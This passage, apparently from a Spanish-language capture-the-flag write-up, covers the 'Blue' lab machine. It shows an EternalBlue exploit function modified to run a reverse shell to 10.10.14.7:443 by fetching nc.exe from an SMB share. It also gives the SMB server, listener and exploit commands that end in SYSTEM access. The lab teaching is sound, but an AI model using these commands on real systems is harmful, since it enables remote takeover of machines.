+<a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a><span class="n">PASSWORD</span> <span class="o">=</span> <span class="s1">&#39;</span>
+</code></pre></div>
+<p>Y modificar la función <code>smb_pwn</code> con los siguientes cambios, donde se configurara la carga de un netcat para Windows y poder obtener el acceso al mismo tiempo que escuchamos desde nuestra maquina atacante con un netcat y por el puerto 443.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">smb_pwn</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">arch</span><span class="p">):</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>        <span class="n">smbConn</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">get_smbconnection</span><span class="p">()</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>  <span class="c1"># Esta ejecucion de servicio nos permite cargar el archivo descargado de netcat para Windows y cargarlo en la maquina objetivo y ejecutarlo.</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>        <span class="n">service_exec</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;cmd /c </span><span class="se">\\</span><span class="s1">10.10.14.7\smbFolder\nc.exe -e cmd 10.10.14.7 443&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p>Preparamos los ambientes de trabajo para trabajar con netcat, del siguiente link <a href="https://eternallybored.org/misc/netcat/">netcat windows</a> y lo descargamos en la versión <code>netcat 1.12</code>.</p>
+<p>Al descomprimir estos archivos en el directorio de trabajo obtenemos los siguientes resultados.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240626131739.png" /></p>
+<p>Pasar los archivos desde la maquina de trabajo a la maquina objetivo</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>impacket-smbserver<span class="w"> </span>smbFolder<span class="w"> </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="w"> </span>-smb2support
+</code></pre></div>
+<p>Y también colocamos a escuchar un <code>netcat</code> en la maquina host</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>rlwrap<span class="w"> </span>nc<span class="w"> </span>-nlvp<span class="w"> </span><span class="m">443</span>
+</code></pre></div>
+<p>Luego ejecutarnos nuestro Exploit para poder obtener los accesos a la maquina.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>python2<span class="w"> </span>zzz_exploit.py<span class="w"> </span><span class="m">10</span>.10.10.40<span class="w"> </span>samr
+</code></pre></div>
+<p>Finalmente se ha logrado obtener los privilegios de acceso dentro de la maquina Windows 7.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240626134517.png" /></p>
+<p>Al finalizar este proceso, se puede observar que esta vulnerabilidad de <strong>EternalBlue</strong>, nos permite tener acceso como usuario administrador <code>nt authority\system</code>, con lo cual podemos proceder a tener una escalabilidad tanto horizontal dentro del sistema, proponiendo tener persistencia dentro de la maquina.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2025 <a href="https://github.com/krozfu"  target="_blank" rel="noopener">KrozFu</a>
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/juan-carlos-charfuelan-caipe" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/krozfu" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.youtube.com/@krozfuhack" target="_blank" rel="noopener" title="www.youtube.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305m-317.51 213.508V175.185l142.739 81.205z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/krozfu" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.instagram.com/krozfu/" target="_blank" rel="noopener" title="www.instagram.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141m0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7m146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8m76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8M398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.sections", "toc.integrate", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
